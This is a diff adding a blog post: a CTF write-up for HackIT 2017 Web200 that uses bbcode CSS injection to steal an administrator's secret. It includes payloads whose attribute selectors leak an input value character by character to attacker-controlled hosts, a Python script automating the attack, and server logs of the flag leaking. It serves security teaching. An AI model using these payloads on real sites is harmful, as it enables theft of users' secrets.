@@ -158,6 +158,122 @@
 
   <span class="post-date">
     
+    August
+    27th,
+    
+    2017
+  </span>
+
+  <h2>
+    <a href="/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html">CTF Write-Up - HackIT CTF 2017 Web200</a>
+  </h2>
+
+  <div>
+    
+    <p>I participated at the HackIT 2017 CTF with team sec0d, and we finished first. As requested by some other teams, here’s a write-up for the Web200 CTF challenge of HackIT 2017.</p>
+
+<h3 id="introduction">Introduction</h3>
+
+<p>The application seems pretty straightforward, we can register with an username, a password, and a secret. The goal of the challenge is to recover the secret of an administrator.</p>
+
+<h3 id="solution">Solution</h3>
+
+<p>Checking the source of the profile page, we can see some interesting information:
+<img src="/assets/media/hackit_5.png" alt="Authenticated on eonweb" /></p>
+
+<p>First, the secret is shown in an input tag. We can see that we can edit part of our profile as well by using <code class="highlighter-rouge">edit.php</code>. This page will edit the “about” field of our user.
+We can also see that there is an administrator function commented in the html, hinting us of a potential XSS or similar attack, as the administrator will have a list of updated status in his dashboard.</p>
+
+<p>XSS tentatives will be proven to be unsuccessful, as we do not have access to the <code class="highlighter-rouge">&lt;</code> and <code class="highlighter-rouge">&gt;</code> characters and we are not in an attribute. A bbcode function is however enabled on the application, allowing us to input interesting data, for example, <code class="highlighter-rouge">[code]Message[/code]</code> will be translated to <code class="highlighter-rouge">&lt;pre&gt;Message&lt;/pre&gt;</code>. Testing all possible bbcodes, one, in particular will be interesting to us, <code class="highlighter-rouge">color</code>.</p>
+
+<p><img src="/assets/media/hackit_2.png" alt="Authenticated on eonweb" /></p>
+
+<p>The <code class="highlighter-rouge">color</code> bbcode injected, we can see the result:
+<img src="/assets/media/hackit_3.png" alt="Authenticated on eonweb" /></p>
+
+<p>As shown in the screenshot, the parameter “test” is inserted inside a <code class="highlighter-rouge">style</code> tag, and since other characters are not correctly filtered, we can do a CSS injection:</p>
+
+<figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="o">[</span><span class="nt">color</span><span class="o">=</span><span class="s1">"test;} * {background: url('http://attacker.net/test')"</span><span class="o">]</span><span class="nt">a</span><span class="o">[/</span><span class="nt">color</span><span class="o">]</span></code></pre></figure>
+
+<p>Using that as input will change the background image of some HTML tags and generate a request to our website.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">80.252.154.43 - - <span class="o">[</span>27/Aug/2017:02:05:01 +0200] <span class="s2">"GET /test HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span></code></pre></figure>
+
+<p>Now that we know we can inject CSS and that there is effectively a bot running on the app, we can try to recover the <code class="highlighter-rouge">input</code> value using attribute selector in CSS:</p>
+
+<figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="o">[</span><span class="nt">color</span><span class="o">=</span><span class="s1">"test;} input[value^="</span><span class="nt">h4ck1t</span><span class="s1">" i]{background: url('http://attacker.net/confirmed')"</span><span class="o">]</span><span class="nt">a</span><span class="o">[/</span><span class="nt">color</span><span class="o">]</span></code></pre></figure>
+
+<p>This will check if the value of the input starts with h4ck1t, the <code class="highlighter-rouge">i</code> modifier after the selector is there to be case insensitive, since the page will lowercase all input value sent.</p>
+
+<p>After sending that, we got our response, the flag format being <code class="highlighter-rouge">h4ck1t{flag}</code>, we can confirm that we only have to automate the attack :)</p>
+
+<p>The server and bot being somewhat unreliable, we had to try everything manually. On a stable challenge, this challenge could be solved using a loop checking the character one by one.</p>
+
+<noscript><pre>from pwn import *
+from requests import *
+import string
+import sys
+import time
+
+def edit(s, cookie, bla):
+        s.post(&quot;http://tasks.ctf.com.ua:13373/edit.php&quot;, cookies=cookie, data={&quot;about&quot;: bla})
+
+s = Session()
+
+cookie = {&quot;PHPSESSID&quot;: &quot;85gdkck3eegdmu215o02ac8rq0&quot;}
+bla = &#39;&#39;&#39;[color=&quot;test;} input[value^=&quot;&#39;&#39;&#39;+sys.argv[1]+&#39;&#39;&#39;&quot; i]{border-image: url(&#39;http://rioru.net/?a=&#39;&#39;&#39;+ sys.argv[1]+&#39;&#39;&#39;&quot;]a[/color]&#39;&#39;&#39;
+log.info(&quot;Sending [%s, %s]&quot; % (i, bla))
+edit(s, cookie, bla)
+edit(s, cookie, bla)
+
+r = s.get(&quot;http://tasks.ctf.com.ua:13373/profile.php&quot;, cookies=cookie)
+
+print r.text</pre></noscript>
+<script src="https://gist.github.com/rioru/8dd25be546c6bbcb3974c8deb549224c.js"> </script>
+
+<p><code class="highlighter-rouge">Usage: python web200.py 'h4ck1t{c...'</code></p>
+
+<p>And finally, in our logs, after a little bit of guessing and a sleep() time of 10 seconds…</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:11:51 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:12:04 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:13:21 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_10;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:14:06 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1n0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:14:12 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:14:52 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj30;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:15:17 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n1;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:15:45 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:16:20 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:18:34 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:27:18 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:32:09 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:33:02 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h10;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:41:10 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:43:22 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d30;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:45:39 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d30;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:48:12 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:48:47 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:49:08 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:49:37 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:49:57 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s30;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:50:09 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s3c0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:50:22 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s3cr3t0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:51:12 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s3cr3ts0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span>
+80.252.154.43 - - <span class="o">[</span>27/Aug/2017:04:51:24 +0200] <span class="s2">"GET /?a=h4ck1t{c</span><span class="nv">$$</span><span class="s2">_1nj3ct10n_h1d3s_s3cr3ts}0;} HTTP/1.1"</span> 302 5 <span class="s2">"http://tasks.ctf.com.ua:13373/profile.php"</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0"</span></code></pre></figure>
+
+<h3 id="bonus">Bonus</h3>
+<p>After solving the challenge, a friend I did the CTF with told me there could be a faster solution than bruteforcing the characters ourselves, even on unreliable servers. It is possible to simply create a lot of selectors, like <code class="highlighter-rouge">h4ck1t{[a-z0-9]</code> and by sending one request, the server will answer us with one character.</p>
+
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
     March
     28th,
     
